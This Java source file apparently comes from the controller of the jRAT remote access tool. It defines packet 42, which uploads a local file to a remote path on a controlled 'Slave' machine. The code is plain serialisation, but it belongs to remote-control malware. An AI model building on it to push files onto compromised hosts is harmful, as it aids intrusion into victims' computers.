package se.jrat.controller.packets.outgoing;

import java.io.DataOutputStream;
import java.io.File;

import se.jrat.controller.Slave;
import se.jrat.controller.threads.UploadThread;

public class Packet42ServerUploadFile extends AbstractOutgoingPacket {

	private File file;
	private String remoteFile;
	private boolean temp;
	private UploadThread thread;

	public Packet42ServerUploadFile(File file, String remoteFile) {
		this(file, remoteFile, false);
	}
	
	public Packet42ServerUploadFile(File file, String remoteFile, boolean temp) {
		this.file = file;
		this.remoteFile = remoteFile;
		this.temp = temp;
		this.thread = new UploadThread(null, remoteFile, file);
	}
	
	public Packet42ServerUploadFile(File file, String remoteFile, boolean temp, UploadThread thread) {
		this.file = file;
		this.remoteFile = remoteFile;
		this.temp = temp;
		this.thread = thread;
	}
	
	@Override
	public void write(final Slave slave, DataOutputStream dos) throws Exception {
		dos.writeBoolean(temp);
		slave.writeLine(remoteFile);
		dos.writeLong(file.length());

		if (file.exists() && file.isFile()) {
			thread.setSlave(slave);
			thread.getData().setObject(slave);
			thread.getData().start();
		}
	}

	@Override
	public byte getPacketId() {
		return 42;
	}

}
